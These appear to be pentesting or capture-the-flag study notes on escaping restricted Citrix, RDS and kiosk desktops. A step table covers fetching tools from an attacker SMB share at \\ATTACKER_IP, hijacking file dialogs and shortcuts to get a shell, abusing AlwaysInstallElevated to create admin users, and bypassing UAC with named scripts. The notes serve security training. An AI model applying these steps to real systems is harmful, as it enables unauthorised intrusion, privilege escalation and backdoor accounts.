üîπ Summary (What You‚Äôre Learning Here)
You're learning how to break out of restricted/kioskized desktop environments (Citrix, RDS, AWS AppStream, PSM, Kiosk) to:

Bypass GUI lockdowns

Access command execution

Move laterally or escalate privileges

Bypass UAC or get SYSTEM

Most orgs think Citrix = security. You‚Äôre here to prove otherwise.

‚öôÔ∏è Got This, Do That (Methodical Flow)
Got This	Do That
File Explorer is locked down	Use Save/Open dialogs via Paint, Notepad, Wordpad
Dialog Box (File Picker) opens	Input UNC path: \\127.0.0.1\c$\users\USERNAME or to attacker share
Need to transfer tools	Run smbserver.py on your box ‚Üí Browse to \\ATTACKER_IP\share
Can‚Äôt copy via dialog	Right-click and run payload directly (pwn.exe, .bat, .ps1, etc.)
Need full GUI file access	Use portable Explorer++.exe from your SMB share
Can‚Äôt launch Regedit	Use SmallRegistryEditor or UberRegEdit
Have a .lnk (shortcut) file	Change the ‚ÄúTarget‚Äù to cmd.exe via Properties
No shortcut available	Drop .lnk via SMB or generate with PowerShell
CMD access achieved	Drop and run PowerUp.ps1, winPEAS, or Bypass-UAC.ps1
Registry keys show AlwaysInstallElevated = 1	Use Write-UserAddMSI to create .msi ‚Üí Run it to make admin user
Backdoor admin still blocked by UAC	Use Bypass-UAC.ps1 with method UacMethodSysprep
You need proof of SYSTEM	whoami /priv + read C:\Users\Administrator\Desktop\flag.txt
üß† Patterns & Hints
Dialog Boxes = Breakout Gold. Look for ‚ÄúOpen,‚Äù ‚ÄúSave,‚Äù ‚ÄúPrint,‚Äù or ‚ÄúBrowse‚Äù in ANY GUI app.

Use UNC paths to bypass drive restrictions (e.g., \\127.0.0.1\c$).

Use portable apps from SMB shares to escalate further.

Scripts auto-executing by extension is a privilege escalator (e.g., .bat, .ps1).

Default AlwaysInstallElevated = 1? Big green light to create local admins.

Shortcut trick is one of the stealthier methods ‚Äî very overlooked.

UAC is your final boss ‚Äî but several off-the-shelf scripts (like PowerUp and Bypass-UAC) handle it clean.
